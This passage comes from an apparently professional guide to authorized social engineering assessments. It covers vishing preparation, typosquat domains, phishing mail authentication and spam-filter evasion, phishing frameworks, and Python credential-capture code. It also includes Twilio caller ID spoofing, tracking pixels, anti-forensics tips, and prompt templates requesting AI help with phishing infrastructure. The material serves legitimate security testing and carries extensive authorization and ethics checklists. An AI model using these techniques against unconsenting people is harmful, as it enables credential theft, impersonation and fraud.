Call 3 (if needed): [Final urgent push]

Create a coordinated script series where:
- Each call references previous interactions
- Urgency escalates appropriately
- Consistency is maintained across calls
- Natural progression of the pretext

Include notes on timing and what triggers each subsequent call.
```

---

### Verification Checklist

Before conducting vishing calls:

**Script Readiness:**
- [ ] Scripts sound natural and conversational
- [ ] Technical details are accurate for target organization
- [ ] Objection handling covers likely scenarios
- [ ] Abort conditions are clearly defined
- [ ] All team members understand the scripts

**Legal and Ethical Validation:**
- [ ] Call recording is legal in jurisdiction
- [ ] Authorization explicitly permits vishing
- [ ] Impersonation does not violate laws
- [ ] No prohibited targets in call list
- [ ] No prohibited pretext elements present

**Infrastructure Readiness:**
- [ ] Calling system tested and functional
- [ ] Caller ID configured appropriately
- [ ] Call recording enabled and tested
- [ ] Background environment appropriate
- [ ] Backup calling method available

**Team Preparation:**
- [ ] Callers have practiced scripts
- [ ] Role-playing sessions completed
- [ ] Technical knowledge verified
- [ ] Note-taking procedures established
- [ ] Documentation templates ready

**Operational Security:**
- [ ] No personal phones being used
- [ ] VoIP service obscures caller identity
- [ ] Recording storage is secure
- [ ] No inadvertent information disclosure in setup

**Target Intelligence:**
- [ ] Call list verified against authorization
- [ ] Target roles and technical levels known
- [ ] Best calling times identified
- [ ] Expected challenges understood

**Response Procedures:**
- [ ] Plan for if target reports call
- [ ] Plan for if target becomes confrontational
- [ ] Plan for if target calls back
- [ ] Coordination with client on handling reports

---

### Common Mistakes to Avoid

❌ **Reading scripts verbatim**
- Sounds robotic and unnatural
- Doesn't adapt to target's responses
- Breaks flow of conversation

❌ **Insufficient technical knowledge**
- Can't answer basic questions
- Uses wrong terminology
- Exposes lack of familiarity with organization

❌ **Poor voice acting**
- Tone doesn't match pretext urgency
- Can't maintain character consistency
- Laughs or breaks character under pressure

❌ **Inadequate objection handling**
- Gives up too easily when challenged
- Becomes aggressive when questioned
- Can't gracefully exit when compromised

❌ **Ignoring abort signals**
- Continues when target is clearly suspicious
- Pushes too hard against resistance
- Doesn't recognize when to end call

❌ **Poor documentation**
- Doesn't take notes during call
- Forgets key details afterward
- Can't reconstruct conversation for reporting

❌ **Operational security failures**
- Uses personal phone number
- Reveals real identity or location
- Doesn't verify call is being recorded

❌ **Legal boundary violations**
- Impersonates law enforcement
- Makes threats or creates panic
- Collects information outside authorization

---

### Testing and Practice

**Internal Rehearsal:**

1. **Script Familiarization:**
   - Read scripts multiple times
   - Practice out loud until natural
   - Identify difficult sections

2. **Role-Playing Sessions:**
   - Team members play target roles
   - Practice handling objections
   - Test different conversation branches
   - Rotate caller and target roles

3. **Technical Practice:**
   - Test calling system with scripts
   - Practice note-taking while talking
   - Verify recording quality
   - Test background noise levels

4. **Scenario Variations:**
   - Practice with compliant targets
   - Practice with suspicious targets
   - Practice with confused/frustrated targets
   - Practice abort scenarios

**External Testing (if permitted):**
- Test calls to non-target organization members
- Verify scripts work in real conditions
- Identify weaknesses in real conversations
- Refine based on actual call experiences

---

### During Call Execution

**Best Practices:**

**Maintain Character:**
- Consistent tone and energy throughout
- Don't break character even if target is difficult
- Mirror target's communication style appropriately

**Active Listening:**
- Hear what target is actually saying
- Adapt responses to their concerns
- Note unexpected information or questions

**Note-Taking:**
- Document key points without obvious typing
- Use shorthand or quick notes
- Record full details immediately after call

**Know When to Abort:**
- Target explicitly states they're testing you
- Target involves supervisor or security
- You've been asked to hold while they verify
- Target seems to be recording (asks permission)
- Your cover is clearly blown

**Natural Conversation Flow:**
- Let target talk, don't rush them
- Use natural pauses and acknowledgments
- Don't fill every silence with talking
- Breathe and stay calm

---

### Post-Call Procedures

**Immediate Documentation:**
- Full conversation summary
- Information gathered
- Target's security awareness level
- Success/failure against objectives
- Any unusual responses or red flags

**Team Coordination:**
- Update campaign tracking
- Share lessons learned
- Coordinate follow-up calls
- Alert team to any issues (target reported, etc.)

**Secure Data Handling:**
- Move call recordings to secure storage
- Encrypt sensitive information captured
- Maintain audit trail
- Follow data retention policies

---

### Next Steps

After vishing campaign:

**Results Analysis:**
- Success rate (achieved objective vs. not)
- Target security awareness by role/department
- Most effective techniques
- Objections encountered
- Time to compromise average

**Reporting Preparation:**
- Which targets fell for vishing
- What information was obtained
- Security gaps identified in helpdesk procedures
- Recommendations for improvement

**Remediation Recommendations:**
- Helpdesk verification procedures
- Employee training needs
- Technical controls (callback verification, etc.)
- Policy updates

---

## Infrastructure & Operational Security Considerations

This section provides guidance on the technical infrastructure and operational security measures needed to support social engineering campaigns safely and effectively.

### Domain Registration and Management

**Domain Selection Strategy:**

Choose domains that support your pretext without being obviously suspicious:

**Typosquatting Domains:**
- Similar to target: `techcorp.com` → `tech-corp.com`, `techcorp.co`, `techcorps.com`
- Advantages: Familiar to targets, might pass quick glance
- Disadvantages: Obvious to security teams, may violate trademark laws
- Consideration: Check legal implications before registering

**Subdomain Strategy:**
- Generic parent domain: `employee-portal.com`, `identity-services.com`
- Pretext-specific subdomains: `mfa-verify.employee-portal.com`
- Advantages: Professional appearance, flexible for multiple campaigns
- Disadvantages: Parent domain needs legitimate appearance

**Generic Service Domains:**
- Purpose-built: `secure-verification.com`, `identity-confirm.com`
- Advantages: Reusable across clients/campaigns, not tied to specific target
- Disadvantages: Less immediately trusted, requires stronger pretext

**Registration Best Practices:**

```
✅ DO:
- Use WHOIS privacy protection
- Register well before campaign (avoid "newly registered" red flag)
- Use legitimate registrar (GoDaddy, Namecheap, etc.)
- Register similar variants (.com, .co, .net) to prevent defensive registration
- Have plausible registration information if WHOIS looked up

❌ DO NOT:
- Register with personal information
- Register day-of or day-before campaign
- Use free/sketchy registrars
- Register obvious typosquat domains for established brands without legal review
- Leave administrative contacts traceable to assessment team
```

**For detailed domain strategy guidance:**

```markdown
I need domain recommendations for my social engineering campaign.

Campaign context:
- Target organization: [name and legitimate domain]
- Pretext: [brief description of your SE scenario]
- Campaign duration: [how long domain needs to exist]
- Legal concerns: [any trademark/brand protection issues]
- Reusability: [one-time use or multiple campaign use]

Provide:
1. Three domain options with pros/cons
2. Registration timing recommendation
3. WHOIS privacy and registration details
4. DNS configuration basics
5. Legal considerations specific to my target
```

---

### Email Infrastructure and Authentication

**Sending Email Setup:**

For phishing campaigns to successfully reach inboxes rather than spam folders:

**Email Server Options:**
- **VPS + Mail Server:** Full control (Postfix, SendMail, etc.)
- **Email Service Providers:** Mailgun, SendGrid, Amazon SES
- **Specialized Phishing Frameworks:** Gophish (includes email sending)

**SPF, DKIM, DMARC Configuration:**

These records help your phishing emails pass authentication checks:

**SPF (Sender Policy Framework):**
- Declares which mail servers can send from your domain
- Example: `v=spf1 ip4:203.0.113.10 ~all`
- Purpose: Prevents spoofing, helps deliverability

**DKIM (DomainKeys Identified Mail):**
- Cryptographic signature proving email came from your domain
- Requires private key on mail server, public key in DNS
- Purpose: Verifies email wasn't modified in transit

**DMARC (Domain-based Message Authentication):**
- Policy for how receivers handle authentication failures
- Example: `v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com`
- Purpose: Provides feedback on authentication results
- Recommendation: Use `p=none` for phishing (not rejected on failure)

**Configuration Steps:**
1. Set up mail server or service provider
2. Generate DKIM keys (if applicable)
3. Add DNS records (TXT records for SPF, DKIM, DMARC)
4. Test email authentication (mail-tester.com)
5. Monitor deliverability during campaign

**Avoiding Spam Filters:**
- Proper email authentication (SPF/DKIM/DMARC pass)
- Avoid spam trigger words ("urgent", "verify now", "click here")
- Reasonable send volumes (don't blast thousands instantly)
- Warm up new domains/IPs gradually if possible
- Match legitimate organizational email patterns

**For detailed email infrastructure setup:**

```markdown
I need to set up email sending infrastructure for phishing campaign.

Requirements:
- Expected volume: [number of emails over time period]
- Domain: [your registered domain]
- Hosting: [VPS, cloud provider, or email service preference]
- Technical expertise: [low/medium/high server admin knowledge]
- Budget: [constraints]

Provide:
1. Recommended setup approach for my volume and expertise
2. Step-by-step SPF/DKIM/DMARC configuration
3. Testing procedures for email authentication
4. Deliverability optimization tips
5. Monitoring setup for bounce rates and delivery issues
```

---

### Landing Page Hosting and Security

**Hosting Options:**

**Cloud Providers (AWS, Azure, GCP, DigitalOcean):**
- Advantages: Reliable, scalable, professional infrastructure
- Disadvantages: May have acceptable use policies against phishing
- Recommendation: Review ToS, use for authorized assessments only
- Setup: EC2/VM instance, configure web server (Nginx/Apache)

**VPS Providers (Linode, Vultr, OVH):**
- Advantages: More permissive policies, less scrutiny
- Disadvantages: Variable reliability, less "enterprise" credibility
- Setup: Similar to cloud providers

**Specialized Phishing Platforms:**
- Gophish: Open-source phishing framework
- Evilginx2: Advanced phishing with 2FA bypass
- Modlishka: Reverse proxy phishing framework
- Advantages: Built for phishing, includes tracking, management UI
- Disadvantages: Requires setup and technical knowledge

**SSL Certificate Setup:**

HTTPS is essential for modern phishing (browsers warn on HTTP):

**Let's Encrypt (Free, Automated):**
```bash
# Example with Certbot on Ubuntu
sudo apt-get install certbot python3-certbot-nginx
sudo certbot --nginx -d your-domain.com
```

**Benefits of HTTPS:**
- Browser doesn't show "Not Secure" warning
- Targets more likely to trust page
- Encrypts traffic (including captured credentials)
- Appears more legitimate

**Configuration Best Practices:**
- Use strong TLS configuration (TLS 1.2+)
- Disable weak ciphers
- Configure HTTP → HTTPS redirect
- Test SSL configuration (ssllabs.com)

**CDN and DDoS Protection:**

**Cloudflare Benefits:**
- Free SSL certificate (alternative to Let's Encrypt)
- DDoS protection (if campaign attracts attention)
- Caching (faster page loads)
- Professional appearance (Cloudflare IPs, not sketchy VPS)
- Analytics (traffic insights)

**Cloudflare Setup:**
- Create account, add domain
- Update nameservers at registrar
- Enable "Full" or "Full (Strict)" SSL mode
- Configure page rules if needed

**For detailed hosting setup guidance:**

```markdown
I need hosting setup guidance for phishing landing pages.

Requirements:
- Expected traffic: [volume and timing]
- Technical stack: [HTML/PHP/Python/etc.]
- Infrastructure preference: [cloud/VPS/framework]
- Budget: [constraints]
- Advanced needs: [2FA bypass, MFA handling, etc.]

Provide:
1. Hosting recommendation for my requirements
2. Web server configuration (Nginx or Apache)
3. SSL certificate setup steps
4. CDN/Cloudflare integration
5. Monitoring and analytics setup
6. Backup and redundancy considerations
```

---

### Credential Capture and Storage

**Secure Backend Implementation:**

Never store captured credentials insecurely:

**Storage Options:**

**Database (Recommended for volume):**
- SQLite: Simple, file-based, good for moderate volume
- PostgreSQL/MySQL: Scalable, better for high volume
- Encryption: Encrypt at rest, secure connection strings

**File-Based (Simple scenarios):**
- JSON/CSV files with proper permissions (600)
- Encrypt files (GPG, OpenSSL)
- Regular backups to secure location

**Example Secure Capture (Python + SQLite):**

```python
import sqlite3
from hashlib import sha256
from datetime import datetime
import os

# Initialize encrypted database
def init_db():
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY, 
                  username TEXT, 
                  password_hash TEXT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT)''')
    conn.commit()
    conn.close()

# Store captured credential securely
def store_credential(username, password, ip, user_agent):
    # Hash password (one-way) - cannot recover but can verify
    password_hash = sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("INSERT INTO captures VALUES (NULL, ?, ?, ?, ?, ?)",
              (username, password_hash, datetime.now().isoformat(), ip, user_agent))
    conn.commit()
    conn.close()
    
    # Notify team (separate function)
    send_notification(username, ip)
```

**Note:** This example hashes passwords. For assessments where you need actual passwords for testing, store encrypted (AES) instead of hashed, but protect encryption key securely.

**Real-Time Notifications:**

Alert assessment team when credentials captured:

**Notification Methods:**
- Email (to secure team email)
- Slack/Discord webhook
- SMS (Twilio API)
- Dashboard alerts (if using phishing framework)

**Example Email Notification:**

```python
import smtplib
from email.mime.text import MIMEText

def send_notification(username, ip):
    msg = MIMEText(f"Credential captured\nUsername: {username}\nIP: {ip}\nTime: {datetime.now()}")
    msg['Subject'] = '[PHISHING] Credential Captured'
    msg['From'] = 'assessment@yourdomain.com'
    msg['To'] = 'team@yourdomain.com'
    
    s = smtplib.SMTP('localhost')
    s.send_message(msg)
    s.quit()
```

**Data Retention and Deletion:**

```
Best Practices:
✅ Define retention period in contract (e.g., 30 days post-assessment)
✅ Securely delete after period expires
✅ Encrypt credentials at rest
✅ Limit access to assessment team only
✅ Log all access to captured credential database
✅ Use secure connections (SSH, VPN) to access data

❌ Never store plaintext on web-accessible locations
❌ Never email credentials unencrypted
❌ Never retain beyond contract obligations
❌ Never share with unauthorized parties
```

---

### Vishing Technical Infrastructure

**VoIP Service Selection:**

**Popular Services:**
- **Twilio:** Enterprise-grade, API-driven, expensive but reliable
- **Google Voice:** Consumer-friendly, free, limited features
- **Vonage:** Business VoIP, good call quality
- **Bandwidth:** Developer-focused, SIP trunking

**Caller ID Spoofing:**

**Legal Considerations:**
- Legal in some jurisdictions for authorized testing
- Illegal for fraud, harassment, or unauthorized impersonation
- Verify local laws before implementing
- Document authorization for spoofing

**Implementation (where legal):**
```python
# Example with Twilio API
from twilio.rest import Client

client = Client(account_sid, auth_token)

call = client.calls.create(
    to='+15551234567',           # Target number
    from_='+15559876543',        # Spoofed caller ID (helpdesk number)
    url='http://your-server.com/twiml'  # Call script
)
```

**Call Recording Setup:**

**Legal Requirements:**
- One-party consent: Caller can record (most of US)
- Two-party consent: Both parties must consent (CA, FL, others)
- Always check jurisdiction laws
- Consider announcement: "This call may be recorded for quality purposes"

**Recording Options:**
- **VoIP provider recording:** Built-in (Twilio records automatically if configured)
- **Local recording:** Software like Audacity, OBS
- **Hardware recording:** Physical recording devices

**Storage and Retention:**
- Encrypt recorded calls
- Store separately from other assessment data
- Delete per contract terms
- Access control (assessment team only)

**For detailed vishing infrastructure setup:**

```markdown
I need vishing infrastructure setup for phone-based social engineering.

Requirements:
- Expected call volume: [number over time period]
- Caller ID requirements: [spoofing needed? If so, what number?]
- Geographic location: [calling from/to, jurisdiction]
- Recording requirements: [legal basis and retention]
- Budget: [constraints]

Provide:
1. VoIP service recommendation
2. Caller ID configuration steps (legal considerations included)
3. Call recording setup and legal compliance
4. Call quality optimization
5. OPSEC for avoiding trace-back to assessment team
```

---

### Monitoring and Analytics

**Campaign Tracking Needs:**

**Email Campaigns:**
- Open rates (tracking pixel)
- Click rates (unique URLs per recipient)
- Credential submissions
- Time-to-compromise (email sent → credential entered)
- Reporting rates (forwards to IT/Security)
- Geographic and temporal patterns
- Device/browser statistics

**Landing Page Analytics:**
- Page visits vs. unique visitors
- Time on page
- Form submission rate (visits → submissions)
- Drop-off points (where users leave)
- Error rates (form validation failures)
- Successful credential captures

**Vishing Metrics:**
- Call answer rate
- Call duration
- Successful manipulation rate
- Objection types encountered
- Time-to-compromise
- Target security awareness levels

**Tracking Implementation:**

**Email Tracking Pixels:**
```html
<!-- Invisible 1x1 pixel image -->
<img src="https://your-domain.com/track/open/{{unique_id}}" width="1" height="1" style="display:none;" />
```

**Unique Link Tracking:**
```
https://mfa-verify.techcorp-security.com/verify?uid={{unique_id}}

Backend logs:
- {{unique_id}} identifies specific recipient
- Timestamp of click
- User agent and IP address
- Subsequent actions on page
```

**Analytics Dashboards:**

**Gophish Built-in Dashboard:**
- Real-time campaign statistics
- Individual target tracking
- Timeline visualization
- Export capabilities

**Custom Analytics (for custom infrastructure):**
- Google Analytics (for page analytics, not credential tracking)
- Custom logging to database
- Visualization with Grafana, Kibana, or custom dashboards

**Privacy and Data Minimization:**

```
Best Practices:
✅ Collect only data necessary for assessment objectives
✅ Anonymize where possible (IP addresses, user agents)
✅ Aggregate data for reporting (don't need individual details in final report)
✅ Minimize retention period
✅ Secure analytics database

❌ Don't collect unnecessary personal information
❌ Don't use third-party analytics that might expose campaign
❌ Don't retain tracking data longer than engagement requires
```

---

### Operational Security (OPSEC) for Campaigns

**Protecting Campaign Infrastructure:**

**Avoid Attribution to Assessment Team:**
- Use dedicated infrastructure (not personal devices/networks)
- VPN or proxy for accessing campaign infrastructure
- Separate email accounts for notifications (not personal email)
- No personal information in domain WHOIS
- No re-use of infrastructure across unrelated clients

**Network Segmentation:**
```
Campaign Infrastructure Network:
├── Phishing Email Server (isolated)
├── Landing Page Web Server (isolated)
├── Credential Database (isolated, restricted access)
├── Vishing VoIP Infrastructure (isolated)
└── Management/Analytics (secure access only)

Access Controls:
- SSH key authentication (no passwords)
- Firewall rules (whitelist assessment team IPs only)
- VPN for remote access
- MFA on all accounts
```

**Forensic Awareness:**

Assume target organization will forensically analyze your infrastructure if campaign is detected:

**Minimize Forensic Traces:**
- No comments in HTML/JS revealing it's a phishing campaign
- No references to client name in code or configs
- No personal identifiers in logs or databases
- No test accounts with obvious names ("test@", "admin@")
- Remove development artifacts (.git, .swp, .bak files)

**Example Bad Code (Don't Do This):**
```html
<!-- Phishing campaign for TechCorp assessment - Contract #SE-2024-091 -->
<!-- TODO: Fix credential capture bug -->
<!-- Contact joe@assessment-company.com if issues -->
<form action="/capture.php">
```

**Example Good Code:**
```html
<!-- Standard authentication form -->
<form action="/auth" method="POST">
```

**Log Management:**
- Regularly review logs for sensitive information
- Sanitize before storing long-term
- Encrypt logs at rest
- Rotate logs frequently
- Have log deletion procedures

**Contingency Planning:**

**If Campaign is Detected:**
- Immediate notification to client contact
- Campaign pause procedures (stop emails, take down pages)
- Communication plan with client
- Forensic evidence preservation (for client's learning)

**If Infrastructure is Compromised:**
- Immediate shutdown procedures
- Data breach notification (if captured credentials exposed)
- Client communication protocols
- Incident response procedures

**If Legal Issues Arise:**
- Documented authorization readily accessible
- Legal counsel contact information
- Preserve all engagement documentation
- Cooperation procedures with client

---

## Testing & Validation Workflows

This section provides systematic testing procedures to validate social engineering materials before deployment, ensuring effectiveness while minimizing operational risks.

### Pre-Campaign Testing Checklist

**Email Campaign Testing:**

**1. Technical Validation:**
```
Infrastructure Tests:
□ Sending domain resolves correctly
□ SPF record configured and passing
□ DKIM signature working
□ DMARC record present (p=none recommended)
□ MX records configured if expecting replies
□ Reply-to address exists and is monitored

Email Authentication Tests:
□ Send test email to mail-tester.com (score >7/10)
□ Test email to Gmail (inbox, not spam)
□ Test email to Outlook (inbox, not spam)
□ Test email to Yahoo (inbox, not spam)
□ Verify authentication headers (SPF/DKIM pass)

Rendering Tests:
□ Email displays correctly in Gmail web
□ Email displays correctly in Outlook desktop
□ Email displays correctly in Apple Mail
□ Email displays correctly on mobile (iOS)
□ Email displays correctly on mobile (Android)
□ Images load properly (or graceful degradation)
□ Tracking pixel works (open detection)

Functionality Tests:
□ All links in email work correctly
□ Unique tracking URLs resolve
□ Personalization tokens populate correctly
□ Unsubscribe link (if present) works
□ Reply-to generates response to correct inbox
```

**2. Content Validation:**
```
Believability Assessment:
□ Email tone matches organizational communication style
□ Technical details are accurate for target environment
□ Sender name/address appears legitimate
□ Subject line is compelling but not obvious phishing
□ Call-to-action is clear and unambiguous
□ Urgency level is appropriate (not excessive)

Comparison with Legitimate Emails:
□ Side-by-side comparison with real org emails
□ Similar length and structure
□ Matching formatting and branding
□ Consistent language and terminology
□ No obvious grammatical or spelling errors

Red Flag Check:
□ No obvious phishing indicators (typos in domain, etc.)
□ No suspicious URLs (obvious redirects, IP addresses)
□ No excessive urgency or threats
□ No requests for unusual information
□ No obvious generic template language
```

**3. Operational Readiness:**
```
Monitoring Setup:
□ Dashboard for real-time open/click tracking
□ Alerting configured for captures
□ Logging configured for all interactions
□ Backup monitoring in place

Team Preparation:
□ Team aware of campaign timing
□ Response procedures documented
□ Incident handling procedures established
□ Client notification protocol clear

Documentation:
□ Campaign plan documented
□ Target list verified against authorization
□ Expected metrics baseline established
□ Reporting template prepared
```

---

**Landing Page Testing:**

**1. Visual Accuracy:**
```
Appearance Validation:
□ Side-by-side comparison with legitimate page
□ Logo correct (size, placement, quality)
□ Colors match exactly (use color picker)
□ Fonts match or are acceptable substitutes
□ Layout matches (spacing, alignment, proportions)
□ Buttons/inputs match styling
□ Footer elements present and correct

Screenshots for Comparison:
□ Capture legitimate page at multiple screen sizes
□ Capture phishing page at same sizes
□ Identify any discrepancies
□ Fix or document acceptable differences
```

**2. Functional Testing:**
```
Form Functionality:
□ Form fields accept input correctly
□ Client-side validation works (if present)
□ Submit button functions properly
□ Correct fields are marked as required
□ Tab order through form is logical
□ Enter key submits form (or not, as appropriate)

Backend Integration:
□ Form submission reaches backend
□ Credentials are captured and stored
□ Database/file storage is working
□ Notification triggers upon capture
□ Success message displays correctly
□ User is redirected appropriately (if applicable)

Edge Case Testing:
□ Empty form submission (should error gracefully)
□ Invalid email format (validation)
□ Special characters in password (handles correctly)
□ Very long inputs (doesn't break page)
□ SQL injection attempts (sanitized)
□ XSS attempts (sanitized)
□ Rapid repeated submissions (rate limiting if implemented)
```

**3. Cross-Platform Testing:**
```
Desktop Browsers:
□ Chrome (latest)
□ Firefox (latest)
□ Safari (latest macOS)
□ Edge (latest)

Mobile Devices:
□ iPhone Safari (iOS)
□ Android Chrome
□ Tablet view (iPad, Android tablet)

Responsive Design:
□ Layout adapts to screen width
□ Form remains usable at all sizes
□ Text is readable (not too small)
□ Buttons are tappable (not too small)
□ No horizontal scrolling required
```

**4. Security and Performance:**
```
Security Validation:
□ HTTPS working (valid certificate)
□ No mixed content warnings
□ Credentials encrypted in transit
□ Credentials stored securely
□ No sensitive data in client-side code
□ No obvious vulnerabilities (SQLi, XSS)

Performance Testing:
□ Page loads in <2 seconds
□ Images optimized (not too large)
□ No unnecessary external resources
□ Form submission is responsive
□ Database can handle expected volume

Console Error Check:
□ No JavaScript errors in console
□ No 404s for missing resources
□ No CORS errors
□ No SSL/TLS errors
```

**5. Forensic Cleanliness:**
```
Anti-Forensics Check:
□ No comments revealing phishing campaign
□ No references to client name in code
□ No test accounts or obvious test data
□ No development artifacts (.git, .DS_Store, etc.)
□ No personal identifiers in logs
□ Metadata stripped from images
□ Server headers don't reveal unnecessary info
```

---

**Vishing Testing:**

**1. Script Validation:**
```
Script Review:
□ Scripts sound natural when read aloud
□ Technical details are accurate
□ Objection handling is comprehensive
□ Abort conditions are clear
□ Conversation flows logically

Team Familiarization:
□ All callers have practiced scripts
□ Callers can improvise within pretext
□ Callers know when to abort
□ Callers understand documentation procedures
```

**2. Infrastructure Testing:**
```
Calling System Tests:
□ VoIP service is functional
□ Call quality is acceptable
□ Caller ID displays as intended
□ Call recording works
□ Recording quality is clear
□ Background noise is appropriate level

Test Calls:
□ Test call to team member's phone
□ Verify caller ID displays correctly
□ Verify recording captures full conversation
□ Verify audio quality is professional
□ Test emergency abort procedures
```

**3. Role-Playing Practice:**
```
Internal Practice Sessions:
□ Callers practice with team members playing targets
□ Practice compliant target scenario
□ Practice suspicious target scenario
□ Practice confused target scenario
□ Practice aggressive/angry target scenario
□ Practice abort scenario

Performance Review:
□ Natural delivery (not reading)
□ Appropriate tone and urgency
□ Effective objection handling
□ Maintains pretext under pressure
□ Professional demeanor throughout
□ Clean exit from calls
```

**4. Operational Readiness:**
```
Procedures Documented:
□ Call list and timing plan
□ Note-taking template prepared
□ Success/failure criteria defined
□ Escalation procedures clear
□ Post-call documentation process

Monitoring Setup:
□ Call recording storage configured
□ Real-time tracking system ready
□ Team coordination method established
□ Client notification protocol clear
```

---

### Staged Deployment Testing

**Phased Rollout Approach:**

Instead of deploying entire campaign immediately, use staged deployment:

**Phase 1: Internal Team Test (Day 0)**
- Send emails to internal team members
- Have team click links, submit credentials
- Verify all tracking and capture working
- Identify any technical issues
- Fix problems before external deployment

**Phase 2: Limited External Test (Day 1)**
- Deploy to small subset (5-10 targets)
- Closely monitor results
- Verify emails reach inboxes
- Verify landing page handles traffic
- Assess initial response rates
- Make adjustments if needed

**Phase 3: Broader Deployment (Day 2+)**
- Deploy to full target list
- Stagger sends to avoid overwhelming infrastructure
- Monitor for issues (bounces, complaints, technical failures)
- Be ready to pause if problems detected

**Phase 4: Follow-Up/Reminder (If Applicable)**
- Send reminder emails to non-responders
- Different subject line and slight content variation
- Track differential response rates

---

### Issue Response Procedures

**Common Issues and Responses:**

**Issue: Emails Going to Spam**
```
Diagnosis:
- Check spam score (mail-tester.com)
- Verify SPF/DKIM/DMARC passing
- Review content for spam triggers
- Check sending rate (too many too fast?)

Response:
- Pause campaign
- Fix authentication issues
- Adjust content to reduce spam score
- Warm up domain/IP (if new)
- Resume with fixed configuration
```

**Issue: Landing Page Down or Slow**
```
Diagnosis:
- Check server status
- Check resource usage (CPU, RAM, disk)
- Review error logs
- Test from multiple locations

Response:
- Restart services if needed
- Scale resources if under load
- Fix any application errors
- Consider CDN if traffic spike
- Communicate with team about downtime
```

**Issue: Targets Reporting Phishing Attempt**
```
Diagnosis:
- How many reports received?
- What specifically tipped them off?
- Is campaign compromised?

Response:
- Notify client immediately per protocol
- Assess whether to continue or pause
- Document lessons learned
- Adjust future campaigns based on detection methods
```

**Issue: Higher Than Expected Success Rate**
```
Diagnosis:
- Is target population more vulnerable than expected?
- Is pretext particularly effective?
- Are security controls weaker than anticipated?

Response:
- Continue monitoring
- Ensure all captures are documented
- Consider early campaign conclusion if objectives met
- Prepare comprehensive reporting
- Emphasize urgency of remediation to client
```

**Issue: Lower Than Expected Success Rate**
```
Diagnosis:
- Are emails reaching inboxes?
- Is landing page functional?
- Is pretext not resonating?
- Are targets more aware than expected?

Response:
- Verify technical infrastructure
- Review analytics for drop-off points
- Consider A/B testing different approaches
- May need to adjust pretext or delivery method
- Document factors reducing effectiveness
```

---

## Legal & Ethical Reminders

### Final Authorization Verification

Before executing ANY social engineering technique in this guide:

**Required Documentation:**
- [ ] Written contract or Statement of Work signed by authorized client representative
- [ ] Explicit authorization for social engineering techniques being used
- [ ] Defined scope including permitted targets and prohibited targets
- [ ] Clear timeline for campaign execution
- [ ] Agreed-upon success criteria and metrics
- [ ] Data handling and retention agreements
- [ ] Liability protections and insurance coverage
- [ ] Legal review of engagement terms
- [ ] Client contact information for questions or issues
- [ ] Emergency stop procedures documented

**Scope Boundaries:**
- [ ] I know exactly who I am authorized to target
- [ ] I know exactly who is prohibited (C-suite, legal, etc.)
- [ ] I know exactly what techniques are permitted (email, phone, etc.)
- [ ] I know exactly what information I can collect
- [ ] I know the geographic/jurisdictional boundaries
- [ ] I know what constitutes exceeding my authorization
- [ ] I have a process for scope clarification questions

**Legal Protections:**
- [ ] Professional liability insurance covers this engagement
- [ ] Contract includes hold-harmless provisions
- [ ] Legal counsel is available if issues arise
- [ ] I understand local laws regarding impersonation, fraud, recording
- [ ] I have documented authorization readily accessible
- [ ] I know when to immediately stop and consult counsel

**IF YOU CANNOT CHECK EVERY BOX WITH CONFIDENCE, DO NOT PROCEED.**

Contact your client, your legal counsel, or both. It is ALWAYS better to delay a campaign to get proper authorization than to execute without clear boundaries.

---

### Ethical Guidelines for Social Engineering Assessments

**Core Ethical Principles:**

**1. Minimize Harm**
- Do not create genuine panic, fear, or distress
- Do not exploit personal tragedies or vulnerabilities
- Do not cause business disruption beyond engagement objectives
- Do not damage target's reputation or relationships
- Consider psychological impact of successful manipulation

**2. Respect Autonomy**
- Target individuals can disengage (even if they don't know it's a test)
- Do not manipulate targets into illegal activities
- Do not create situations requiring personal financial expenditure
- Respect privacy beyond engagement requirements

**3. Maintain Professionalism**
- Conduct assessments professionally, not gleefully
- Document thoroughly for client learning
- Provide constructive feedback and remediation guidance
- Take no joy in successfully manipulating individuals
- Remember targets are doing their jobs, not adversaries

**4. Data Protection**
- Collect only data necessary for assessment
- Protect captured credentials rigorously
- Delete data per contract terms
- Never use captured credentials outside engagement scope
- Never share captured data with unauthorized parties

**Prohibited Practices:**

```
NEVER:
❌ Impersonate law enforcement or emergency services
❌ Create medical or safety emergencies
❌ Exploit personal tragedies (death, illness, divorce)
❌ Request money transfers or financial transactions
❌ Attempt to access systems not explicitly authorized
❌ Continue manipulating someone who's clearly distressed
❌ Use captured credentials for anything except authorized testing
❌ Share embarrassing details about individuals who fell for SE
❌ Conduct assessments without proper authorization
❌ Exceed your authorized scope
```

**Stop Conditions:**

Immediately cease social engineering if:
- Target expresses genuine distress or emotional harm
- Target's actions could result in financial loss
- Target's actions could result in their termination
- You've discovered information suggesting actual compromise (not your assessment)
- Scope is ambiguous and client contact is unavailable for clarification
- Legal or ethical boundaries are being approached

---

### Professional Responsibility

**As a Security Professional Conducting SE Assessments:**

**You are responsible for:**
- Ensuring you have proper authorization before beginning
- Staying within defined scope boundaries
- Protecting captured data and credentials
- Conducting assessments professionally and ethically
- Reporting findings constructively to help improve security
- Stopping immediately if authorization is questionable
- Maintaining confidentiality of engagement details
- Providing value to client through thorough documentation

**You are NOT responsible for:**
- Targets' decisions during assessment (they made choices based on manipulation)
- Organizational security failures discovered (you're documenting, not creating them)
- Client's remediation choices based on your findings
- Whether client acts on your recommendations

**But remember:**
- Your actions have real consequences for real people
- Targets are employees doing their jobs, not enemies
- Successful manipulation is not a personal victory
- The goal is organizational improvement, not individual embarrassment
- Professional conduct reflects on the entire security assessment industry

---

### Client Communication and Transparency

**Before Campaign:**
- Ensure client understands what you will do
- Clarify boundaries and prohibited activities
- Establish communication protocols
- Define success criteria
- Agree on handling of sensitive findings

**During Campaign:**
- Immediate notification if serious vulnerabilities discovered
- Regular status updates per agreement
- Immediate notification if scope questions arise
- Immediate notification if target reports campaign
- Immediate notification of any issues or concerns

**After Campaign:**
- Comprehensive reporting of findings
- Remediation recommendations
- Employee education suggestions (without shaming individuals)
- Process improvement recommendations
- Comparison to industry baselines (if available)
- Discussion of engagement lessons learned

---

### Final Ethical Check

Before deploying any social engineering campaign:

**Ask Yourself:**
1. **Authorization:** Do I have clear, written authorization for this specific technique against these specific targets?
2. **Necessity:** Is this technique necessary to achieve the assessment objectives, or am I choosing it because it's interesting?
3. **Proportionality:** Is the potential psychological impact on targets proportional to the security value gained?
